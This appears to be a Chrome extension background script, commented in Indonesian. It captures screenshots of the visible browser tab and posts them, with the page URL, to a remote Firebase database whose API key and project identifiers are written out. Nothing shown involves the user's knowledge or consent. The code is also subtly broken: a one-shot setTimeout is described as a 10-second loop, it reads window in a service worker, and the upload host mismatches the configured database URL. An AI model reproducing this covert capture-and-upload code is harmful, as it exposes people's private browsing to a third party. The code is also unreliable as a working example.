// Ganti bagian ini dengan config Firebase dari Project Settings Anda
const firebaseConfig = {
  apiKey: "AIzaSyAZ5VwOIWJLtf6eYeJJM6iR0V4eOUKRVEA",
  authDomain: "alvin-91c15.firebaseapp.com",
  databaseURL: "https://alvin-91c15-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "alvin-91c15",
  storageBucket: "alvin-91c15.firebasestorage.app",
  messagingSenderId: "895524161698",
  appId: "1:895524161698:web:ce0c151aa671cc0906affb"
};

// Inisialisasi Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);
const screenshotRef = ref(database, 'screenshots');

// Fungsi untuk mengambil screenshot
function captureScreenshot() {
  // Mengambil URL gambar dari visible tab
  chrome.tabs.captureVisibleTab(null, { format: "png" }, (dataUrl) => {
    if (chrome.runtime.lastError) {
      console.error("Error capturing tab:", chrome.runtime.lastError);
      return;
    }

    // Simpan data ke Firebase (Webhook sederhana via push)
    // Di lingkungan browser, mengirim string panjang ke RTDB mungkin limit-nya, 
    // jadi kita gunakan Fetch ke Firebase REST API secara langsung lebih efisien.
    sendDataToFirebase(dataUrl);
  });
}

// Fungsi pengiriman ke Firebase (Lebih efisien tanpa library JS yang berat)
const sendDataToFirebase = async (dataUrl) => {
  const body = {
    image: dataUrl,
    timestamp: new Date().toISOString(),
    url: window.location.href
  };

  try {
    // Menggunakan Firebase REST API layaknya curl command
    const response = await fetch(`https://${firebaseConfig.projectId}-default-rtdb.firebaseio.com/screenshots.json`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body)
    });
    
    console.log("Data terkirim ke Firebase:", response.ok);
  } catch (error) {
    console.error("Gagal mengirim data:", error);
  }
};

// Jalankan fungsi setiap 10 detik (Opsional: ubah ke 60 jika ingin hemat resource)
setTimeout(() => {
  captureScreenshot();
  // Unsubscribe loop if needed, tapi service worker berjalan consistent
}, 10000); 